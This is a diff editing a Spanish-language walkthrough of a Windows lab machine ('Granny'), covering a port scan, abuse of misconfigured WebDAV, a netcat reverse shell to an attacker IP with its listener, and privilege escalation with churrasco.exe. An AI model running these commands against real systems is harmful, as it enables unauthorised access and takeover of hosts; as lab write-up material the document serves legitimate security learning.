@@ -14,9 +14,9 @@
 | **Sistema operativo** | Windows      |
 | **Dificultad**        | Fácil        |
 
-## ## Vectores y Técnicas de Explotación
+## Vectores y Técnicas de Explotación
 
-El compromiso de este activo se divide en las siguientes fases tácticas:
+El compromiso de este activo se divide en las siguientes fases:
 
 - **Fase de Reconocimiento:** Enumeración exhaustiva de servicios web, identificando extensiones de servidor **WebDAV** mal configuradas que permiten métodos HTTP peligrosos (PUT/MOVE).
 
@@ -52,7 +52,7 @@ Se ejecutó un escaneo exhaustivo sobre el rango completo de puertos TCP (**0-65
 **Comando ejecutado:**
 
 ```bash
-namp -p- --open -sS --min-rate 5000 -Pn -n 10.129.95.234 
+nmap -p- --open -sS --min-rate 5000 -Pn -n 10.129.95.234 
 ```
 
 **Resultados:**
@@ -177,17 +177,15 @@ Una vez confirmada la vulnerabilidad de **RCE** y la conectividad bidireccional 
 
 ### Ejecución y acceso inicial
 
-**Establecimiento de Reverse Shell**
-
 Tras cargar exitosamente el binario en el sistema objetivo, se procedió a la ejecución de una **reverse shell** para obtener una consola interactiva. El proceso se realizó de la siguiente manera:
 
-- **Lado del Objetivo (Web-Shell):** Se invocó `nc.exe` para redirigir el flujo de la consola `cmd.exe` hacia la dirección IP del atacante.
+- **Lado del Objetivo (Web-Shell):**
 
 ```DOS
 C:\inetpub\wwwroot\nc.exe -e cmd.exe 10.10.16.77 3000
 ```
 
-- **Lado del Atacante (Listener):** Se configuró un receptor utilizando `rlwrap` para mejorar la estabilidad de la shell y el manejo del historial.
+- **Lado del Atacante (Listener):**
 
 ```bash
 rlwrap nc -nlvp 3000
@@ -195,11 +193,11 @@ rlwrap nc -nlvp 3000
 
 #### Resultados y Limitaciones
 
+![Acceso](../Granny/Images/access.png)
+
 Se logró el acceso inicial al sistema; sin embargo, los privilegios de la cuenta actual son restringidos (identificada como cuenta de servicio). Durante la fase de enumeración post-explotación, se confirmó la **denegación de acceso** al directorio personal del usuario `Lakis`, lo que impide la lectura de vectores de información sensible o flags de usuario.
 
 Debido a estas restricciones de permisos, el siguiente paso operativo consiste en una **Escalada de Privilegios** para elevar el contexto de seguridad en el host.
-
-![Acceso](../Granny/Images/access.png)
 
 ![no-flag | 800](../Granny/Images/no-flag.png)
 
@@ -224,7 +222,7 @@ Durante la fase de preparación, se identificó una incompatibilidad crítica: e
 
 Ante esta limitación, se optó por el uso de [churrasco.exe](https://github.com/Re4son/Churrasco/blob/master/churrasco.exe). Esta herramienta es una alternativa especializada para sistemas Windows antiguos que permite abusar del privilegio `SeImpersonatePrivilege` mediante la interceptación de tokens en el servicio de resolución de nombres de red, logrando un impacto idéntico al de la familia "Potato" en entornos contemporáneos.
 
-![supported-systems](supported-systems.png)
+![supported-systems](../Granny/Images/supported-systems.png)
 
 #### Despliegue del Exploit
 
